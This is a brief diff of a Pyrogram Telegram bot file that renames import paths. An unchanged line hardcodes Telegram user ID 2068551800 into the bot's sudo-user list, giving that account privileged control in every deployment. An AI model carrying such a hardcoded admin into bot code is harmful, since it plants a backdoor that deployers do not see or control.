@@ -1,8 +1,8 @@
 from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
-from modules.helpers.admins import get_administrators
-from modules.config import SUDO_USERS
+from Lisa.helpers.admins import get_administrators
+from Lisa.config import SUDO_USERS
 
 SUDO_USERS.append(2068551800)
 
